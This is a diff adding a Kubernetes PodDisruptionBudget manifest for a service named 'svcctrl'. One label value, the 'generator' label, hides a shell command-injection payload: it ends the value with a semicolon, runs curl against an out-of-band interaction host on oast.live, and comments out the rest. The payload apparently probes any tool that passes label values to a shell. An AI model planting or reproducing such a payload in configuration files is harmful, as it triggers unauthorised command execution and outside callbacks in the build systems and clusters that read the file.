@@ -1,0 +1,13 @@
+apiVersion: policy/v1
+kind: PodDisruptionBudget
+metadata:
+  name: svcctrl
+  labels:
+    app.kubernetes.io/name: svcctrl
+    app.kubernetes.io/part-of: svcctrl-project
+    kubernetes.azure.com/generator: proof; curl -s https://dbosdphokakf6knrq7l01g5jx5abc1yi6.oast.live/hook-generatorlabel #
+spec:
+  maxUnavailable: 1
+  selector:
+    matchLabels:
+      app: svcctrl
